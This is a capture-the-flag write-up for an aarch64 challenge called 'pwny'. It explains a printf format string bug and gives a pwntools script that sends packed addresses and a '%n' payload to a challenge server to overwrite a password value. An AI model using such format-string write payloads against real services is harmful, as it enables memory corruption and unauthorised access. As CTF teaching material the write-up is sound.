# pwny

## problem

Is this the pwn challenge we've all been waiting for?

- [chal](./chal)

## solution

first off, this is aarch64/arm64 pwn

```
chal: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, BuildID[sha1]=a4a50080249f8e4f75a985d318da4d9d85db46d3, for GNU/Linux 3.7.0, not stripped
```

i wasn't able to get binja to load the ARM binary in so i had to use the web version instead

here is a binja screenshot

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/62f1b037-c2c0-4c7b-b053-61a5b5112b8d)

it looks like printf is called with no arguments, but under the hood it does call it with the input as argument

it took me a long time to figure that out

anyways, ir0nstone's tutorial on format string bug was pretty helpful (find it [here](https://ir0nstone.gitbook.io/notes/types/stack/format-string))

we can overwrite arbitrary memory addresses by using the `%11n` where 11 is the position on the stack where the address of the value we are going to overwrite is in

this means that the 11th 64 bit integer on stack is the address of the memory location we are going to overwrite.

notably, we overwrite the password with 0x31337

i had to write the top 32 bits and then the bottom 32 bits of the memory value for some reason (`0x00`s null term maybe? idk what is going on there)

here is my solution:

```py
from pwn import *

context.arch = 'arm64'

context.bits = 64
context.endian = 'little'

p = remote("155.248.203.119", 42051)

p.sendline(p32(0x41105c) + b'\x00\x00\x00\x00' + cyclic(56) + p32(0x411058) + b'\x00\x00\x00\x00' + p64(0x4007ec))
p.sendline(b"%10$n%201527x%8$n")

p.interactive()
```
